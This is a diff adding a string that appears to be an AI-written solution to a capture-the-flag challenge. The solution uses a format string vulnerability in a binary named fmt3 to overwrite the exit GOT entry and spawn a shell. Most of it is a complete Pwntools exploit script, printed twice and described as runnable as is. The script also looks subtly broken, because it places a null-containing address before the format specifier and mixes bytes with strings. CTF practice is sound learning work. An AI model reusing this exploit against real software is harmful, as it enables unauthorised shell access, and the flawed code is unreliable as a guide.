@@ -1,0 +1,158 @@
+("To solve this challenge, we'll exploit a format string vulnerability to "
+ 'overwrite the Global Offset Table (GOT) entry of `exit` with the address of '
+ "`sub_4008A6`, which will execute `/bin/sh`. We'll follow these steps:\n"
+ '\n'
+ '1. **Register an account** with a username that contains our format string '
+ 'payload to overwrite the GOT entry.\n'
+ '2. **Use the format string exploit** to write the lower two bytes of '
+ '`sub_4008A6` into `exit@got` using `%hn` (half-word write).\n'
+ '3. **Trigger the exit function** by selecting option 3 from the menu, which '
+ 'will now jump to `sub_4008A6` and spawn a shell.\n'
+ '\n'
+ "Here's how you can achieve this using Pwntools:\n"
+ '\n'
+ '```python\n'
+ 'from pwn import *\n'
+ '\n'
+ '# Set the context for debugging\n'
+ "context.log_level = 'debug'\n"
+ "context.update(arch='amd64', os='linux')\n"
+ '\n'
+ '# Load the binary\n'
+ "elf = ELF('./fmt3')\n"
+ '\n'
+ '# Start the process\n'
+ "p = process('./fmt3')\n"
+ '\n'
+ '# Addresses needed\n'
+ "exit_got = elf.got['exit']\n"
+ "sub_4008A6 = elf.symbols['sub_4008A6']\n"
+ '\n'
+ '# Calculate the lower two bytes to write\n'
+ 'value_to_write = sub_4008A6 & 0xffff  # Get lower 2 bytes of sub_4008A6\n'
+ '\n'
+ '# Number of bytes already written (the address takes up 8 bytes)\n'
+ 'num_written = 8\n'
+ '\n'
+ '# Calculate padding needed for the format string\n'
+ 'padding = (value_to_write - num_written) % 0x10000\n'
+ '\n'
+ '# Build the payload\n'
+ '# The payload consists of:\n'
+ '#   - The address we want to write to (exit@got)\n'
+ '#   - The format string to write the desired value to that address\n'
+ 'payload = p64(exit_got)\n'
+ "payload += '%' + str(padding) + 'c%6$hn'\n"
+ '\n'
+ '# Send the username with the payload\n'
+ "p.recvuntil('Input your username(max lenth:20): ')\n"
+ 'p.sendline(payload)\n'
+ '\n'
+ '# Send a dummy password\n'
+ "p.recvuntil('Input your password(max lenth:20): ')\n"
+ "p.sendline('password')\n"
+ '\n'
+ '# Navigate the menu to trigger the format string vulnerability\n'
+ "p.recvuntil('Your choice:')\n"
+ "p.sendline('1')  # This option prints out the username (our payload), "
+ 'triggering the exploit\n'
+ '\n'
+ '# Send the option to exit, which will now jump to sub_4008A6\n'
+ "p.recvuntil('Your choice:')\n"
+ "p.sendline('3')\n"
+ '\n'
+ '# Interact with the spawned shell\n'
+ 'p.interactive()\n'
+ '```\n'
+ '\n'
+ '**Explanation:**\n'
+ '\n'
+ '- We use `%6$hn` in the format string because the address we placed '
+ '(`exit_got`) is the 6th argument on the stack when the format string is '
+ 'processed.\n'
+ '- The `%hn` specifier writes a 2-byte (half-word) value; since we control '
+ 'only 20 bytes, we write the lower 2 bytes of the address.\n'
+ '- We calculate the padding required to reach the desired value to write by '
+ 'subtracting the number of bytes already written (`num_written`) from the '
+ 'lower two bytes of `sub_4008A6`.\n'
+ '- By selecting option `1` in the menu, we trigger the format string '
+ 'vulnerability, which overwrites the `exit` GOT entry.\n'
+ '- When we select option `3`, the program calls `exit()`, which now points to '
+ '`sub_4008A6`, spawning a shell.\n'
+ '\n'
+ '**Note:** The actual parameter index (`%6$hn` in this case) might vary '
+ "depending on the program's stack at runtime. You may need to adjust this "
+ 'number (e.g., `%7$hn`, `%8$hn`) after checking the stack layout. You can do '
+ "this by sending a payload like `'AAAA %p %p %p %p %p %p %p %p'` and "
+ 'observing where your input appears in the output.\n'
+ '\n'
+ '**Imports and Variables Explained:**\n'
+ '\n'
+ '- `from pwn import *`: Imports all the necessary Pwntools functions.\n'
+ "- `elf = ELF('./fmt3')`: Loads the binary for analysis.\n"
+ '- `exit_got` and `sub_4008A6`: Store the addresses of `exit@got` and '
+ '`sub_4008A6` respectively.\n'
+ "- `context.log_level = 'debug'`: Enables debug logging to see detailed "
+ 'output of the exploit process.\n'
+ '\n'
+ '**Functioning Code Block:**\n'
+ '\n'
+ 'This code can be run directly with the provided binary to exploit the format '
+ 'string vulnerability and get a shell.\n'
+ '\n'
+ '```python\n'
+ 'from pwn import *\n'
+ '\n'
+ '# Set the context for debugging\n'
+ "context.log_level = 'debug'\n"
+ "context.update(arch='amd64', os='linux')\n"
+ '\n'
+ '# Load the binary\n'
+ "elf = ELF('./fmt3')\n"
+ '\n'
+ '# Start the process\n'
+ "p = process('./fmt3')\n"
+ '\n'
+ '# Addresses needed\n'
+ "exit_got = elf.got['exit']\n"
+ "sub_4008A6 = elf.symbols['sub_4008A6']\n"
+ '\n'
+ '# Calculate the lower two bytes to write\n'
+ 'value_to_write = sub_4008A6 & 0xffff  # Get lower 2 bytes of sub_4008A6\n'
+ '\n'
+ '# Number of bytes already written (the address takes up 8 bytes)\n'
+ 'num_written = 8\n'
+ '\n'
+ '# Calculate padding needed for the format string\n'
+ 'padding = (value_to_write - num_written) % 0x10000\n'
+ '\n'
+ '# Build the payload\n'
+ '# The payload consists of:\n'
+ '#   - The address we want to write to (exit@got)\n'
+ '#   - The format string to write the desired value to that address\n'
+ 'payload = p64(exit_got)\n'
+ "payload += '%' + str(padding) + 'c%6$hn'\n"
+ '\n'
+ '# Send the username with the payload\n'
+ "p.recvuntil('Input your username(max lenth:20): ')\n"
+ 'p.sendline(payload)\n'
+ '\n'
+ '# Send a dummy password\n'
+ "p.recvuntil('Input your password(max lenth:20): ')\n"
+ "p.sendline('password')\n"
+ '\n'
+ '# Navigate the menu to trigger the format string vulnerability\n'
+ "p.recvuntil('Your choice:')\n"
+ "p.sendline('1')  # This option prints out the username (our payload), "
+ 'triggering the exploit\n'
+ '\n'
+ '# Send the option to exit, which will now jump to sub_4008A6\n'
+ "p.recvuntil('Your choice:')\n"
+ "p.sendline('3')\n"
+ '\n'
+ '# Interact with the spawned shell\n'
+ 'p.interactive()\n'
+ '```\n'
+ '\n'
+ '**Run this script after ensuring that you have the `fmt3` binary in your '
+ "current directory and that it's executable.**")
